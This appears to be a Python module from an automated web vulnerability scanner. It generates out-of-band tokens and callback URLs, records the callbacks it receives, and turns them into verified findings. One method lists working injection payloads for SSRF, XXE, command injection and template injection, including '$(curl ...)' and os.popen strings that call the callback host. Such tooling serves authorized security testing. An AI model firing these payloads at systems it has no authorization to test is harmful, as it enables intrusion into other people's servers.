"""
OOB Callback Handler - Gestion des callbacks Out-of-Band.

Les callbacks OOB permettent de détecter des vulnérabilités qui ne se
manifestent pas dans la réponse HTTP directe (SSRF, XXE, Blind RCE, etc.)
"""

import asyncio
import json
import uuid
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, List, Dict, Any, Callable
import logging
from dataclasses import dataclass, field

from ..contracts import Finding, FindingSeverity, FindingStatus


logger = logging.getLogger(__name__)


@dataclass
class OOBToken:
    """Token OOB unique pour tracer les callbacks."""
    
    token: str = ""
    request_id: str = ""  # ID de la requête d'attaque associée
    vuln_type: str = ""   # SSRF, XXE, RCE, etc.
    target_url: str = ""
    payload_used: str = ""
    created_at: float = field(default_factory=lambda: datetime.now().timestamp())
    expires_at: float = 0
    callback_received: bool = False
    callback_data: Optional[Dict] = None
    
    def is_expired(self) -> bool:
        return datetime.now().timestamp() > self.expires_at


@dataclass
class OOBCallback:
    """Callback OOB reçu."""
    
    token: str = ""
    source_ip: str = ""
    callback_type: str = ""  # dns, http, https
    received_at: float = field(default_factory=lambda: datetime.now().timestamp())
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    raw_data: Optional[str] = None


class OOBCallbackHandler:
    """
    Gestionnaire de callbacks Out-of-Band.
    
    Supporte:
    - Génération de tokens uniques
    - Tracking des tokens en attente
    - Corrélation callback → requête
    - Intégration avec services OOB (gonzo, interactsh, etc.)
    """
    
    # Durée de validité par défaut des tokens (24h)
    DEFAULT_TTL_HOURS = 24
    
    def __init__(
        self,
        storage_dir: Path,
        oob_domain: str = "",  # ex: your-id.oast.live
        ttl_hours: int = DEFAULT_TTL_HOURS,
    ):
        """
        Args:
            storage_dir: Dossier de stockage des tokens
            oob_domain: Domaine OOB externe (interactsh, etc.)
            ttl_hours: Durée de validité des tokens en heures
        """
        self.storage_dir = Path(storage_dir)
        self.storage_dir.mkdir(parents=True, exist_ok=True)
        
        self.oob_domain = oob_domain
        self.ttl_hours = ttl_hours
        
        # Tokens en attente
        self._pending_tokens: Dict[str, OOBToken] = {}
        
        # Callbacks reçus
        self._callbacks: Dict[str, OOBCallback] = {}
        
        # Listeners pour les nouveaux callbacks
        self._listeners: List[Callable[[OOBToken, OOBCallback], None]] = []
        
        # Charger les tokens persistants
        self._load_pending()
    
    def _load_pending(self) -> None:
        """Charge les tokens en attente du stockage."""
        pending_file = self.storage_dir / "pending_tokens.json"
        if pending_file.exists():
            try:
                data = json.loads(pending_file.read_text())
                for token_data in data:
                    token = OOBToken(**token_data)
                    if not token.is_expired():
                        self._pending_tokens[token.token] = token
            except Exception as e:
                logger.warning(f"Failed to load pending tokens: {e}")
    
    def _save_pending(self) -> None:
        """Sauvegarde les tokens en attente."""
        pending_file = self.storage_dir / "pending_tokens.json"
        data = [
            {
                "token": t.token,
                "request_id": t.request_id,
                "vuln_type": t.vuln_type,
                "target_url": t.target_url,
                "payload_used": t.payload_used,
                "created_at": t.created_at,
                "expires_at": t.expires_at,
                "callback_received": t.callback_received,
            }
            for t in self._pending_tokens.values()
            if not t.is_expired()
        ]
        pending_file.write_text(json.dumps(data, indent=2))
    
    def generate_token(
        self,
        request_id: str,
        vuln_type: str,
        target_url: str = "",
        payload_used: str = "",
    ) -> OOBToken:
        """
        Génère un nouveau token OOB unique.
        
        Args:
            request_id: ID de la requête d'attaque
            vuln_type: Type de vulnérabilité testée
            target_url: URL cible
            payload_used: Payload utilisé
            
        Returns:
            OOBToken avec le token unique
        """
        # Générer un token unique
        unique_id = str(uuid.uuid4())
        token_str = hashlib.md5(f"{request_id}:{unique_id}".encode()).hexdigest()[:12]
        
        # Calculer l'expiration
        expires_at = (datetime.now() + timedelta(hours=self.ttl_hours)).timestamp()
        
        token = OOBToken(
            token=token_str,
            request_id=request_id,
            vuln_type=vuln_type,
            target_url=target_url,
            payload_used=payload_used,
            expires_at=expires_at,
        )
        
        self._pending_tokens[token_str] = token
        self._save_pending()
        
        logger.debug(f"Generated OOB token: {token_str} for {vuln_type}")
        
        return token
    
    def get_callback_url(self, token: OOBToken) -> str:
        """
        Génère l'URL de callback pour un token.
        
        Returns:
            URL de callback (HTTP)
        """
        if self.oob_domain:
            return f"http://{token.token}.{self.oob_domain}"
        return f"http://localhost:8888/{token.token}"
    
    def get_dns_hostname(self, token: OOBToken) -> str:
        """
        Génère le hostname DNS pour un token.
        
        Returns:
            Hostname DNS pour les tests DNS/SSRF
        """
        if self.oob_domain:
            return f"{token.token}.{self.oob_domain}"
        return f"{token.token}.localhost"
    
    def register_callback(
        self,
        token_str: str,
        source_ip: str,
        callback_type: str = "http",
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        raw_data: Optional[str] = None,
    ) -> Optional[OOBToken]:
        """
        Enregistre un callback reçu.
        
        Args:
            token_str: Token reçu dans le callback
            source_ip: IP source du callback
            callback_type: Type (dns, http, https)
            headers: Headers HTTP (si applicable)
            body: Body de la requête (si applicable)
            raw_data: Données brutes
            
        Returns:
            OOBToken correspondant si trouvé, None sinon
        """
        token = self._pending_tokens.get(token_str)
        
        if not token:
            logger.warning(f"Unknown OOB token: {token_str}")
            return None
        
        if token.is_expired():
            logger.warning(f"Expired OOB token: {token_str}")
            del self._pending_tokens[token_str]
            return None
        
        # Créer le callback
        callback = OOBCallback(
            token=token_str,
            source_ip=source_ip,
            callback_type=callback_type,
            headers=headers or {},
            body=body,
            raw_data=raw_data,
        )
        
        # Mettre à jour le token
        token.callback_received = True
        token.callback_data = {
            "source_ip": source_ip,
            "type": callback_type,
            "received_at": callback.received_at,
        }
        
        self._callbacks[token_str] = callback
        self._save_pending()
        
        logger.info(f"OOB callback received for token {token_str} from {source_ip}")
        
        # Notifier les listeners
        for listener in self._listeners:
            try:
                listener(token, callback)
            except Exception as e:
                logger.error(f"Listener error: {e}")
        
        return token
    
    def add_listener(self, callback: Callable[[OOBToken, OOBCallback], None]) -> None:
        """Ajoute un listener pour les nouveaux callbacks."""
        self._listeners.append(callback)
    
    def remove_listener(self, callback: Callable) -> None:
        """Supprime un listener."""
        self._listeners = [l for l in self._listeners if l != callback]
    
    def check_callback(self, token_str: str) -> bool:
        """Vérifie si un callback a été reçu pour un token."""
        token = self._pending_tokens.get(token_str)
        return token.callback_received if token else False
    
    def get_callback(self, token_str: str) -> Optional[OOBCallback]:
        """Récupère le callback pour un token."""
        return self._callbacks.get(token_str)
    
    def get_token(self, token_str: str) -> Optional[OOBToken]:
        """Récupère un token par sa valeur."""
        return self._pending_tokens.get(token_str)
    
    def create_finding_from_callback(
        self,
        token: OOBToken,
        callback: OOBCallback,
    ) -> Finding:
        """
        Crée un Finding à partir d'un callback OOB.
        
        Args:
            token: Token OOB correspondant
            callback: Callback reçu
            
        Returns:
            Finding avec les détails
        """
        # Déterminer la sévérité selon le type de vuln
        severity_map = {
            "SSRF": FindingSeverity.HIGH,
            "XXE": FindingSeverity.HIGH,
            "RCE": FindingSeverity.CRITICAL,
            "BLIND_RCE": FindingSeverity.CRITICAL,
            "DNS_EXFIL": FindingSeverity.MEDIUM,
        }
        severity = severity_map.get(token.vuln_type.upper(), FindingSeverity.MEDIUM)
        
        return Finding(
            endpoint=token.target_url,
            method="",
            vuln_type=token.vuln_type,
            vuln_subtype="oob-confirmed",
            severity=severity,
            status=FindingStatus.VERIFIED,  # OOB = confirmé
            confidence=95,  # Très haute confiance pour OOB
            payload_successful=token.payload_used,
            ai_analysis=f"Out-of-band callback received from {callback.source_ip} ({callback.callback_type})",
            impact=f"Server made external request to attacker-controlled endpoint",
            reproduction_steps=[
                f"Target: {token.target_url}",
                f"Payload: {token.payload_used}",
                f"Callback received at: {datetime.fromtimestamp(callback.received_at).isoformat()}",
                f"Source IP: {callback.source_ip}",
            ],
            tool_used="oob_callback",
        )
    
    def cleanup_expired(self) -> int:
        """
        Supprime les tokens expirés.
        
        Returns:
            Nombre de tokens supprimés
        """
        expired = [
            token_str for token_str, token in self._pending_tokens.items()
            if token.is_expired()
        ]
        
        for token_str in expired:
            del self._pending_tokens[token_str]
            if token_str in self._callbacks:
                del self._callbacks[token_str]
        
        if expired:
            self._save_pending()
        
        return len(expired)
    
    def pending_count(self) -> int:
        """Retourne le nombre de tokens en attente."""
        return len([t for t in self._pending_tokens.values() if not t.callback_received])
    
    def received_count(self) -> int:
        """Retourne le nombre de callbacks reçus."""
        return len([t for t in self._pending_tokens.values() if t.callback_received])
    
    def get_payloads_for_type(self, vuln_type: str, token: OOBToken) -> List[str]:
        """
        Génère des payloads OOB pour un type de vulnérabilité.
        
        Args:
            vuln_type: Type de vuln (SSRF, XXE, etc.)
            token: Token à inclure dans les payloads
            
        Returns:
            Liste de payloads
        """
        callback_url = self.get_callback_url(token)
        dns_host = self.get_dns_hostname(token)
        
        payloads = {
            "SSRF": [
                callback_url,
                f"http://{dns_host}",
                f"https://{dns_host}",
                f"http://{dns_host}:80",
                f"gopher://{dns_host}:80/_GET / HTTP/1.0%0d%0a%0d%0a",
            ],
            "XXE": [
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>',
                f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]>',
                f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>',
            ],
            "RCE": [
                f"curl {callback_url}",
                f"wget {callback_url}",
                f"nslookup {dns_host}",
                f"ping -c 1 {dns_host}",
                f"$(curl {callback_url})",
                f"`curl {callback_url}`",
            ],
            "SSTI": [
                f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('curl {callback_url}').read()}}}}",
                f"${{T(java.lang.Runtime).getRuntime().exec('curl {callback_url}')}}",
            ],
        }
        
        return payloads.get(vuln_type.upper(), [callback_url])
